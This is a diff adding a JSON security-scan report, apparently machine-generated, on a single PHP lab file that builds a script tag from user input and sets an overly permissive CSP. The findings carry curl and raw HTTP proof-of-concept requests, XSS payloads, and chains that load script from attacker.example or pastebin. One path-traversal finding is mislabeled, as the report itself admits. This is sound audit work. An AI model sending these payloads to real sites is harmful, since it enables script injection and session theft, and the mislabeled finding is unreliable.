@@ -1,0 +1,1080 @@
+{
+  "schema_version": "1.0",
+  "generator": {
+    "name": "落日二号乙 / Sunset Two Beta",
+    "version": "1.0.0"
+  },
+  "run": {
+    "run_id": "20261031-164207-c98ff3",
+    "generated_at": "2026-10-31T08:43:11.446922+00:00",
+    "input_mode": "zip",
+    "target_url": "",
+    "zip_path": "C:\\Users\\liyuf\\Desktop\\794\\暴风星云裂\\020.zip",
+    "zip_sha256": "f7bc24fccdcc53d2a999c3468bedf97d91c239734baf4f227ae7ef495dbe0b26",
+    "duration_sec": 64.4
+  },
+  "project": {
+    "file_count": 1,
+    "text_file_count": 1,
+    "languages": {
+      "php": 1
+    },
+    "frameworks": [],
+    "endpoint_count": 0,
+    "endpoints": [],
+    "files": [
+      {
+        "path": "020.php",
+        "language": "php",
+        "lines": 27,
+        "size": 1040
+      }
+    ]
+  },
+  "summary": {
+    "text": "本次汇总基于单文件 PHP 脚本 020.php（27 行）的已去重 findings，共 4 条，全部带 POC（with_poc=4）。最高危为 020.php 第 15 行：$_POST['include'] 未编码直接拼入 <script src> 属性，同时被规则判为 path_traversal（GEN-dda61ef2bad8，high）与 client_side_validation（SEM-cc52c467496c，high），LLM 侧同点判为反射型 XSS（LLM-370901c0cb4c，medium，行 17）；另有第 3 行 CSP script-src 白名单过宽（SEM-582e93de1b73，medium）。需注意：该点本质是输出注入/属性注入，path_traversal 的类型标签与标题描述（“输出注入，非路径穿越”）不一致，交付时应以 XSS/输出编码缺失为主类型，path_traversal 标签需人工纠正。4 条 POC 均为 HTTP 型（POST 参数反射），但均未动态验证，仅为静态文本工件。",
+    "total_findings": 4,
+    "with_poc": 4,
+    "by_severity": {
+      "high": 2,
+      "medium": 2
+    },
+    "by_verdict": {
+      "candidate": 4
+    },
+    "by_evidence_level": {
+      "rule_verified+llm": 3,
+      "llm_inferred": 1
+    },
+    "by_origin": {
+      "rule": 3,
+      "llm_finding": 1
+    },
+    "second_order": 0,
+    "injection_signals": 0,
+    "quarantined_files": []
+  },
+  "findings": [
+    {
+      "id": "GEN-dda61ef2bad8",
+      "title": "020.php 第 15 行 $_POST['include'] 未编码直接拼入 <script src> 属性（输出注入，非路径穿越）",
+      "vulnerability_type": "path_traversal",
+      "cwe": "CWE-22",
+      "cwe_name": "路径穿越 / 任意文件读写",
+      "severity": "high",
+      "cvss_estimate": 8.1,
+      "cvss_note": "按严重度给出的粗略估计，不是正式 CVSS 评分。",
+      "confidence": 0.55,
+      "verdict": "candidate",
+      "evidence_level": "rule_verified+llm",
+      "origin": "rule",
+      "needs_verification": true,
+      "location": {
+        "file": "020.php",
+        "line_start": 13,
+        "line_end": 15,
+        "endpoint": "/020",
+        "http_method": "POST"
+      },
+      "source": "query `include`（020.php:15）",
+      "sink": "020.php:15 <script src='\" . $_POST['include'] . \"'></script>",
+      "description": "020.php:13-15：`if (isset ($_POST['include'])) { $page['body'] .= \"\\n\\t<script src='\" . $_POST['include'] . \"'></script>\"`。攻击者通过 POST 参数 include 提交任意字符串，该值未经 HTML 属性编码、未做 URL/协议白名单校验，直接拼接进 `<script src='...'>` 的单引号属性中。由于属性使用单引号包裹且未转义，输入中的单引号可闭合属性并注入新的 HTML 标签/属性（例如 `x' onerror='...` 或闭合后追加 `<script>`），属于反射型输出注入（HTML 注入 / 潜在 XSS）。候选将其归类为 path_traversal 不准确：此处不存在文件路径构造或文件访问，数据流终点是 HTML 响应体。",
+      "impact": "反射型 HTML/脚本注入：攻击者可构造恶意 POST 表单或自动提交页面，使受害者浏览器加载攻击者指定的脚本源或注入内联事件处理器，从而在目标站点源下执行任意 JavaScript，窃取会话 Cookie、发起 CSRF 操作或篡改页面内容。实际可利用性受第 3 行 CSP 限制（见 SEM-582e93de1b73），但 CSP 白名单包含多个第三方 CDN，若攻击者能在其中任一域托管脚本，则可绕过。",
+      "cve_justification": "CWE-79（跨站脚本）成立条件：外部可控输入（$_POST['include']）未经输出编码进入 HTML 属性上下文，且无需认证即可触发（仅需受害者提交/被诱导提交 POST）。利用链闭合：source=020.php:15 的 $_POST['include']，sink=同行的字符串拼接输出。注意：本候选原始类型标注为 CWE-22，与证据不符，应按输出注入评估。",
+      "suggestion": "对输出到 HTML 属性的值使用 htmlspecialchars($v, ENT_QUOTES, 'UTF-8')；对 script src 使用 URL 白名单校验（仅允许 https 且域名在固定列表内）；优先改为服务端映射的固定脚本名而非用户可控 URL；收紧 CSP，移除不必要的第三方域并考虑 nonce/hash 机制。",
+      "exploit_chain": [
+        {
+          "step": 1,
+          "location": "020.php:15",
+          "description": "从 query `include` 读取外部输入",
+          "data_state": "污点进入 src",
+          "bypass_reason": ""
+        },
+        {
+          "step": 2,
+          "location": "020.php:15",
+          "description": "危险汇点：<script src='\" . $_POST['include'] . \"'></script>",
+          "data_state": "污点进入 path_traversal 汇点",
+          "bypass_reason": "未发现有效净化/参数化"
+        }
+      ],
+      "poc": {
+        "description": "针对 /020（POST）的 路径穿越 / 任意文件读写 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。",
+        "preconditions": [
+          "目标应用已部署且路由可达",
+          "入口 /020 使用 POST",
+          "测试已获得明确授权，且仅使用 TARGET 占位符"
+        ],
+        "steps": [
+          {
+            "step": 1,
+            "action": "确认目标可达且已获授权",
+            "request": "curl -sS -i 'http://TARGET:8080/020'",
+            "expected_response": "返回应用页面/接口响应，而不是连接失败"
+          },
+          {
+            "step": 2,
+            "action": "发送 路径穿越 / 任意文件读写 载荷",
+            "request": "curl -sS -i -X POST 'http://TARGET:8080/020' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GENdda61.txt'",
+            "expected_response": "响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。"
+          },
+          {
+            "step": 3,
+            "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
+            "request": "",
+            "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
+          }
+        ],
+        "payload": "../../../../tmp/sunset_GENdda61.txt",
+        "impact": "攻击者可读取或写入预期目录之外的文件，导致敏感信息泄露、配置篡改，严重时可升级为代码执行。",
+        "cve_justification": "符合 CWE-22。漏洞位于可交付代码 020.php:15，外部输入来自 query `include`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
+        "scripts": {
+          "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/020' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GENdda61.txt'\n",
+          "request.http": "POST /020 HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\n\r\ninclude=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GENdda61.txt\n"
+        },
+        "safety": {
+          "executed": false,
+          "network_egress": false,
+          "requires_authorization": true,
+          "target_uses_placeholder": true,
+          "warnings": [
+            "POC 叙述未明确标注 source→sink 注入点",
+            "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
+          ],
+          "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
+          "contract_validation": {
+            "status": "static_consistent",
+            "errors": [],
+            "warnings": [
+              "POC 叙述未明确标注 source→sink 注入点",
+              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
+            ],
+            "checks": {
+              "static_only": false,
+              "executed": false,
+              "endpoint": "/020",
+              "method": "POST"
+            }
+          }
+        },
+        "artifact_dir": "poc/GEN-dda61ef2bad8"
+      },
+      "external_evidence": [],
+      "verification_notes": "静态证据：入口 POST /020；source=query/include；sink=020.php:15；规则 php-include。未执行 POC、未搭建沙箱；建议在授权环境人工复核。\n链叙事：攻击者构造包含单引号与标签的 POST 请求（include=x' onerror='alert(1) 或 include=x'><script src=//evil></script>）→ 020.php:13 isset 通过 → 020.php:15 直接拼接进 `<script src='...'>` → 响应返回给浏览器 → 属性被闭合，注入的标签/事件处理器执行。全程无文件系统操作，故不是路径穿越。\nPocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:15 的路径穿越（CWE-22）POC。POST 参数 include 在第二处文件操作 sink（第 15 行）同样未经规范化校验，可注入 ../ 序列访问预期目录之外的文件。目标地址使用 TARGET 占位符，仅限授权测试。\nPocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-22。漏洞位于 020.php:15，外部输入来自 POST 参数 include，source→sink 链在给定代码范围内静态闭合，未发现有效净化；具备远程触发条件。证据等级：llm_inferred（基于源码推断，未动态验证）。\nPOC 备注：POC 仅为文本工件，不执行、不联网。执行前将 TARGET 替换为授权测试实例；注意写操作副作用。",
+      "safety": {
+        "executed": false,
+        "requires_authorization": true
+      },
+      "tags": [
+        "path_traversal",
+        "CWE-22",
+        "high",
+        "rule",
+        "rule_verified+llm"
+      ]
+    },
+    {
+      "id": "SEM-cc52c467496c",
+      "title": "020.php 第 15 行外部脚本引入缺少服务端校验（CWE-602 客户端校验依赖）",
+      "vulnerability_type": "client_side_validation",
+      "cwe": "CWE-602",
+      "cwe_name": "客户端校验绕过",
+      "severity": "high",
+      "cvss_estimate": 8.1,
+      "cvss_note": "按严重度给出的粗略估计，不是正式 CVSS 评分。",
+      "confidence": 0.4,
+      "verdict": "candidate",
+      "evidence_level": "rule_verified+llm",
+      "origin": "rule",
+      "needs_verification": true,
+      "location": {
+        "file": "020.php",
+        "line_start": 14,
+        "line_end": 15,
+        "endpoint": "/020",
+        "http_method": "POST"
+      },
+      "source": "client `external JavaScript`（020.php）",
+      "sink": "020.php:15 \t<script src='\" . $_POST['include'] . \"'></script>",
+      "description": "020.php:14-15 将 `$_POST['include']` 拼入 `<script src='...'>`，由浏览器加载外部 JavaScript。候选标注为“客户端校验绕过”，但给定片段中并未出现任何客户端校验逻辑（无 JS 校验函数、无 onsubmit 校验），也未出现服务端对 include 值的合法性校验。实际问题是：脚本来源完全由用户输入决定，服务端未做任何白名单或协议校验，安全边界被交给浏览器/CSP 承担。",
+      "impact": "若依赖 CSP 或浏览器行为作为唯一防护，攻击者可指定任意外部脚本源；结合过宽 CSP（SEM-582e93de1b73），可在白名单域托管恶意脚本并在受害者上下文执行，导致会话劫持与数据泄露。",
+      "cve_justification": "CWE-602 指依赖客户端执行的安全决策。本片段中服务端未对 include 做校验，安全决策实际由浏览器加载行为与 CSP 承担，符合该模式；但片段内未见显式客户端校验代码，故证据部分不足。外部可达性：020.php 公开端点，无需认证。",
+      "suggestion": "在服务端对 include 值执行严格白名单校验（固定脚本名映射或域名白名单 + https 强制），拒绝任何非预期值；不要将安全决策交给浏览器或 CSP；对输出做 HTML 属性编码。",
+      "exploit_chain": [
+        {
+          "step": 1,
+          "location": "020.php:15",
+          "description": "客户端脚本参与校验；需同时审计服务端是否重复校验",
+          "data_state": "语义模式命中",
+          "bypass_reason": "需按 notes 中的运行时/跨文件条件复核"
+        }
+      ],
+      "poc": {
+        "description": "针对 /020（POST）的 客户端校验绕过 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。",
+        "preconditions": [
+          "目标应用已部署且路由可达",
+          "入口 /020 使用 POST",
+          "测试已获得明确授权，且仅使用 TARGET 占位符"
+        ],
+        "steps": [
+          {
+            "step": 1,
+            "action": "确认目标可达且已获授权",
+            "request": "curl -sS -i 'http://TARGET:8080/020'",
+            "expected_response": "返回应用页面/接口响应，而不是连接失败"
+          },
+          {
+            "step": 2,
+            "action": "发送 客户端校验绕过 载荷",
+            "request": "curl -sS -i -X POST 'http://TARGET:8080/020' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=SUNSET_PROBE'",
+            "expected_response": "按漏洞类型观察相应的异常响应/副作用。"
+          },
+          {
+            "step": 3,
+            "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
+            "request": "",
+            "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
+          }
+        ],
+        "payload": "SUNSET_PROBE",
+        "impact": "攻击者可绕过前端限制提交非法数据，导致业务逻辑被绕过、数据完整性受损或触发下游注入类问题。",
+        "cve_justification": "符合 CWE-602。漏洞位于可交付代码 020.php:15，外部输入来自 query `external JavaScript`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
+        "scripts": {
+          "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/020' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=SUNSET_PROBE'\n",
+          "request.http": "POST /020 HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 20\r\n\r\ninclude=SUNSET_PROBE\n"
+        },
+        "safety": {
+          "executed": false,
+          "network_egress": false,
+          "requires_authorization": true,
+          "target_uses_placeholder": true,
+          "warnings": [
+            "POC 叙述未明确标注 source→sink 注入点"
+          ],
+          "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
+          "contract_validation": {
+            "status": "static_consistent",
+            "errors": [],
+            "warnings": [
+              "POC 叙述未明确标注 source→sink 注入点"
+            ],
+            "checks": {
+              "static_only": false,
+              "executed": false,
+              "endpoint": "/020",
+              "method": "POST"
+            }
+          }
+        },
+        "artifact_dir": "poc/SEM-cc52c467496c"
+      },
+      "external_evidence": [],
+      "verification_notes": "静态证据：入口 POST /020；source=client/external JavaScript；sink=020.php:15；规则 php-client-validation。未执行 POC、未搭建沙箱；建议在授权环境人工复核。\n链叙事：攻击者提交 POST include=//attacker.example/x.js → 020.php:15 拼接为 `<script src='//attacker.example/x.js'>` → 服务端无校验直接返回 → 浏览器尝试加载外部脚本。若 CSP 未拦截（白名单域或策略缺失），脚本执行。\nPocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:15 的客户端校验绕过（CWE-602）POC。若安全校验仅在前端 JavaScript 实现而服务端未复验，直接构造 POST 请求即可绕过。目标地址使用 TARGET 占位符，仅限授权测试。\nPocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-602。问题位于 020.php:15，校验依赖客户端 JavaScript，服务端缺少等价复验。证据等级：llm_inferred（基于源码推断，未动态验证）；具体校验字段需补充源码确认。\nPOC 备注：POC 仅为文本工件，不执行、不联网。当前载荷为探测值，实际绕过载荷需依据 020.php:15 的具体校验逻辑补充；若无法确认校验字段，应在 preconditions 标注需补充源码。",
+      "safety": {
+        "executed": false,
+        "requires_authorization": true
+      },
+      "tags": [
+        "client_side_validation",
+        "CWE-602",
+        "high",
+        "rule",
+        "rule_verified+llm"
+      ]
+    },
+    {
+      "id": "LLM-370901c0cb4c",
+      "title": "020.php 中 POST 参数 include 未编码直接拼入 <script src> 导致反射型 XSS",
+      "vulnerability_type": "xss",
+      "cwe": "CWE-79",
+      "cwe_name": "跨站脚本",
+      "severity": "medium",
+      "cvss_estimate": 5.5,
+      "cvss_note": "按严重度给出的粗略估计，不是正式 CVSS 评分。",
+      "confidence": 0.9,
+      "verdict": "candidate",
+      "evidence_level": "llm_inferred",
+      "origin": "llm_finding",
+      "needs_verification": true,
+      "location": {
+        "file": "020.php",
+        "line_start": 13,
+        "line_end": 17,
+        "endpoint": "/020.php",
+        "http_method": "POST"
+      },
+      "source": "body `include`（020.php）",
+      "sink": "020.php:17 字符串拼接后输出到 HTML 响应体（$page['body'] 中的 <script src='...'>）",
+      "description": "020.php 第 13-17 行读取 $_POST['include']，未做任何 HTML 属性编码或白名单校验，直接拼接进 <script src='...'> 的 src 属性并输出到响应体。攻击者可提交包含单引号闭合属性的 payload（如 `' onerror='alert(1)` 或 `'></script><script>alert(1)</script>`），突破 script 标签属性上下文，注入任意 HTML/JS。虽然页面设置了 CSP（第 3-5 行），但 CSP 的 script-src 白名单包含 unpkg.com、cdn.jsdelivr.net、pastebin.com 等可托管任意 JS 的公共 CDN，攻击者可借助这些域加载自己的脚本，CSP 无法阻止。",
+      "impact": "反射型 XSS，可在受害者浏览器上下文执行任意 JS，窃取会话/发起 CSRF/钓鱼；CSP 因白名单含公共 CDN 而无法有效缓解",
+      "cve_justification": "CWE-79：外部可达、无需认证，source（$_POST['include']）到 sink（HTML 输出）链路完整闭合，无编码/校验",
+      "suggestion": "对 include 值使用 htmlspecialchars($v, ENT_QUOTES) 编码；或仅允许 CSP 白名单内的固定域名并做严格 URL 校验；收紧 CSP 移除可托管任意内容的公共 CDN",
+      "exploit_chain": [
+        {
+          "step": 1,
+          "location": "020.php:13",
+          "description": "isset($_POST['include']) 判断参数存在",
+          "data_state": "攻击者完全可控的字符串",
+          "bypass_reason": ""
+        },
+        {
+          "step": 2,
+          "location": "020.php:15",
+          "description": "将 $_POST['include'] 直接拼接到 <script src='...'> 属性中，无 htmlspecialchars/白名单",
+          "data_state": "原始未编码字符串进入 HTML 属性上下文",
+          "bypass_reason": "无任何编码或校验；单引号可闭合 src 属性"
+        },
+        {
+          "step": 3,
+          "location": "020.php:18",
+          "description": "$page['body'] 最终输出到响应，浏览器解析执行注入的 HTML/JS",
+          "data_state": "注入的标签/事件处理器被浏览器执行",
+          "bypass_reason": ""
+        }
+      ],
+      "poc": {
+        "description": "针对 /020.php（POST）的 跨站脚本 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。",
+        "preconditions": [
+          "目标应用已部署且路由可达",
+          "入口 /020.php 使用 POST",
+          "测试已获得明确授权，且仅使用 TARGET 占位符"
+        ],
+        "steps": [
+          {
+            "step": 1,
+            "action": "确认目标可达且已获授权",
+            "request": "curl -sS -i 'http://TARGET:8080/020.php'",
+            "expected_response": "返回应用页面/接口响应，而不是连接失败"
+          },
+          {
+            "step": 2,
+            "action": "发送 跨站脚本 载荷",
+            "request": "curl -sS -i -X POST 'http://TARGET:8080/020.php' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'",
+            "expected_response": "响应中脚本未编码，浏览器执行并弹出 document.domain。"
+          },
+          {
+            "step": 3,
+            "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
+            "request": "",
+            "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
+          }
+        ],
+        "payload": "<script>alert(document.domain)</script>",
+        "impact": "攻击者可在受害者浏览器上下文执行任意脚本，窃取会话 Cookie、伪造请求或实施钓鱼，导致账户接管。",
+        "cve_justification": "符合 CWE-79。漏洞位于可交付代码 020.php:17，外部输入来自 body `include`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
+        "scripts": {
+          "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/020.php' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'\n",
+          "request.http": "POST /020.php HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 61\r\n\r\ninclude=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n"
+        },
+        "safety": {
+          "executed": false,
+          "network_egress": false,
+          "requires_authorization": true,
+          "target_uses_placeholder": true,
+          "warnings": [
+            "POC 叙述未明确标注 source→sink 注入点",
+            "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
+          ],
+          "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
+          "contract_validation": {
+            "status": "static_consistent",
+            "errors": [],
+            "warnings": [
+              "POC 叙述未明确标注 source→sink 注入点",
+              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
+            ],
+            "checks": {
+              "static_only": false,
+              "executed": false,
+              "endpoint": "/020.php",
+              "method": "POST"
+            }
+          }
+        },
+        "artifact_dir": "poc/LLM-370901c0cb4c"
+      },
+      "external_evidence": [],
+      "verification_notes": "需确认 020.php 对外可达及部署方式；CSP 实际生效情况需动态验证\n模型 POC 要点：提交带属性闭合的 include 值，注入 onerror 事件处理器；或借助 CSP 白名单域加载外部脚本\nLLM 深挖（AutoCVE Finding 风格）：单次调用、无工具；文件与行号已校验，代码片段由真实源码回填。\nPocWriter 建议（未采纳，缺少端点 /020.php）：针对 020.php:17 的反射型 XSS（CWE-79）POC。POST 参数 include 的值未经 HTML 编码即回显到响应页面，可注入 <script> 执行任意脚本。目标地址使用 TARGET 占位符，仅限授权测试。\nPocWriter 建议（未采纳，缺少端点 /020.php）：符合 CWE-79。漏洞位于 020.php:17，外部输入来自 POST body 参数 include，source→sink 链在给定代码范围内静态闭合，未发现有效净化；具备远程触发条件。证据等级：llm_inferred（基于源码推断，未动态验证）。\nPOC 备注：POC 仅为文本工件，不执行、不联网。验证时在浏览器中打开构造的请求或使用代理重放，观察弹窗；不要对生产用户投放。",
+      "safety": {
+        "executed": false,
+        "requires_authorization": true
+      },
+      "tags": [
+        "xss",
+        "CWE-79",
+        "medium",
+        "llm_finding",
+        "llm_inferred"
+      ]
+    },
+    {
+      "id": "SEM-582e93de1b73",
+      "title": "020.php 第 3 行 CSP script-src 白名单过宽（CWE-693 防护机制失效）",
+      "vulnerability_type": "csp",
+      "cwe": "CWE-693",
+      "cwe_name": "CSP 配置缺陷",
+      "severity": "medium",
+      "cvss_estimate": 5.5,
+      "cvss_note": "按严重度给出的粗略估计，不是正式 CVSS 评分。",
+      "confidence": 0.7,
+      "verdict": "candidate",
+      "evidence_level": "rule_verified+llm",
+      "origin": "rule",
+      "needs_verification": true,
+      "location": {
+        "file": "020.php",
+        "line_start": 2,
+        "line_end": 3,
+        "endpoint": "/020",
+        "http_method": "POST"
+      },
+      "source": "body `include`（020.php）",
+      "sink": "020.php:3 $headerCSP = \"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;\"; // allows js from various trusted locations",
+      "description": "020.php:3 定义 `$headerCSP = \"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;\"`。该策略允许从 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net 等用户可发布内容的第三方站点加载脚本。这些站点允许任意用户上传/托管 JS，因此 CSP 无法有效阻止攻击者注入的 `<script src>` 指向其托管内容，防护形同虚设。此外策略中缺少 object-src 'none'、base-uri 等指令，且未使用 nonce/hash。",
+      "impact": "CSP 作为 XSS 缓解措施失效：结合 020.php:15 的输出注入，攻击者可将脚本托管在 pastebin/hastebin/unpkg/jsdelivr 等白名单域，使注入的 `<script src>` 通过 CSP 校验并在受害者浏览器执行，导致会话劫持、页面篡改、凭证窃取。",
+      "cve_justification": "CWE-693（防护机制失效）：CSP 是用于缓解 XSS 的安全控制，但其 script-src 白名单包含可被任意用户写入内容的域，控制未达到设计目的。该缺陷为配置型弱点，无需污点链即可成立；外部可达性由 020.php 的公开 HTTP 端点保证，无需认证。",
+      "suggestion": "将 script-src 收紧为 'self' 加必要的固定业务域，移除 pastebin/hastebin/unpkg/jsdelivr 等用户内容托管域；引入 nonce 或 hash 机制；补充 object-src 'none'、base-uri 'self'、frame-ancestors 'none'；对第三方脚本使用 SRI 完整性校验。",
+      "exploit_chain": [
+        {
+          "step": 1,
+          "location": "020.php:3",
+          "description": "CSP 与可控脚本来源联动；需检查最终响应和浏览器加载结果",
+          "data_state": "语义模式命中",
+          "bypass_reason": "需按 notes 中的运行时/跨文件条件复核"
+        }
+      ],
+      "poc": {
+        "description": "针对 /020（POST）的 CSP 配置缺陷 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。",
+        "preconditions": [
+          "目标应用已部署且路由可达",
+          "入口 /020 使用 POST",
+          "测试已获得明确授权，且仅使用 TARGET 占位符"
+        ],
+        "steps": [
+          {
+            "step": 1,
+            "action": "确认目标可达且已获授权",
+            "request": "curl -sS -i 'http://TARGET:8080/020'",
+            "expected_response": "返回应用页面/接口响应，而不是连接失败"
+          },
+          {
+            "step": 2,
+            "action": "发送 CSP 配置缺陷 载荷",
+            "request": "curl -sS -i -X POST 'http://TARGET:8080/020' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=SUNSET_PROBE'",
+            "expected_response": "响应包含 Content-Security-Policy，检查 script-src 是否允许过宽的外部脚本源。"
+          },
+          {
+            "step": 3,
+            "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
+            "request": "",
+            "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
+          }
+        ],
+        "payload": "SUNSET_PROBE",
+        "impact": "CSP 缺失或过宽会削弱对 XSS 的纵深防御，使注入脚本更易执行，放大其他注入类漏洞的影响。",
+        "cve_justification": "符合 CWE-693。漏洞位于可交付代码 020.php:3，外部输入来自 body `include`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
+        "scripts": {
+          "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/020' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'include=SUNSET_PROBE'\n",
+          "request.http": "POST /020 HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 20\r\n\r\ninclude=SUNSET_PROBE\n"
+        },
+        "safety": {
+          "executed": false,
+          "network_egress": false,
+          "requires_authorization": true,
+          "target_uses_placeholder": true,
+          "warnings": [
+            "POC 叙述未明确标注 source→sink 注入点"
+          ],
+          "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
+          "contract_validation": {
+            "status": "static_consistent",
+            "errors": [],
+            "warnings": [
+              "POC 叙述未明确标注 source→sink 注入点"
+            ],
+            "checks": {
+              "static_only": false,
+              "executed": false,
+              "endpoint": "/020",
+              "method": "POST"
+            }
+          }
+        },
+        "artifact_dir": "poc/SEM-582e93de1b73"
+      },
+      "external_evidence": [],
+      "verification_notes": "静态证据：入口 POST /020；source=body/include；sink=020.php:3；规则 php-csp-policy。未执行 POC、未搭建沙箱；建议在授权环境人工复核。\n链叙事：攻击者利用 020.php:15 的属性注入写入 `<script src='https://pastebin.com/raw/xxx'>` → 浏览器按 020.php:3 的 CSP 校验 → pastebin.com 在白名单内，脚本被允许加载执行 → XSS 达成。CSP 本应阻断该链路，但因白名单过宽而失效。\nPocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:3 的 CSP 配置缺陷（CWE-693）POC。该处涉及安全响应头/策略配置，需检查响应中 Content-Security-Policy 是否存在及 script-src 是否过宽。目标地址使用 TARGET 占位符，仅限授权测试。\nPocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-693。问题位于 020.php:3 的安全头/策略配置，属配置型候选，无 HTTP 污点但需检查响应头标志位。证据等级：llm_inferred（基于源码推断，未动态验证）。\nPOC 备注：POC 仅为文本工件，不执行、不联网。验证以响应头为准，需人工确认具体 CSP 指令；若源码未实际输出 CSP 头，应结合 020.php:3 代码复核。",
+      "safety": {
+        "executed": false,
+        "requires_authorization": true
+      },
+      "tags": [
+        "csp",
+        "CWE-693",
+        "medium",
+        "rule",
+        "rule_verified+llm"
+      ]
+    }
+  ],
+  "second_order": [],
+  "security": {
+    "scanned_files": 1,
+    "signal_count": 0,
+    "quarantined_files": [],
+    "by_category": {},
+    "signals": [],
+    "policy": "untrusted-data-envelope + file-allowlist + passive-poc"
+  },
+  "awvs": {
+    "role": "external_corroboration",
+    "note": "AWVS 是外部动态扫描器；本管线只做目标播种与结果回灌，不执行 AWVS 扫描。",
+    "imported": [],
+    "correlations": [],
+    "targets_file": "awvs/targets.json"
+  },
+  "coverage": {
+    "counts": {
+      "path_traversal": 1,
+      "client_side_validation": 1,
+      "xss": 1,
+      "csp": 1
+    },
+    "types": [
+      {
+        "type": "command_injection",
+        "label": "OS 命令注入",
+        "cwe": "CWE-78",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "sql_injection",
+        "label": "SQL 注入",
+        "cwe": "CWE-89",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "ssrf",
+        "label": "服务端请求伪造",
+        "cwe": "CWE-918",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "path_traversal",
+        "label": "路径穿越 / 任意文件读写",
+        "cwe": "CWE-22",
+        "auto_cve": true,
+        "count": 1
+      },
+      {
+        "type": "deserialization",
+        "label": "不安全反序列化",
+        "cwe": "CWE-502",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "ssti",
+        "label": "服务端模板注入",
+        "cwe": "CWE-1336",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "auth_bypass",
+        "label": "认证绕过",
+        "cwe": "CWE-287",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "idor",
+        "label": "越权 / IDOR",
+        "cwe": "CWE-639",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "xxe",
+        "label": "XML 外部实体注入",
+        "cwe": "CWE-611",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "xss",
+        "label": "跨站脚本",
+        "cwe": "CWE-79",
+        "auto_cve": true,
+        "count": 1
+      },
+      {
+        "type": "business_logic",
+        "label": "业务逻辑漏洞",
+        "cwe": "CWE-840",
+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "other",
+        "label": "其他高危问题",
+        "cwe": "CWE-693",
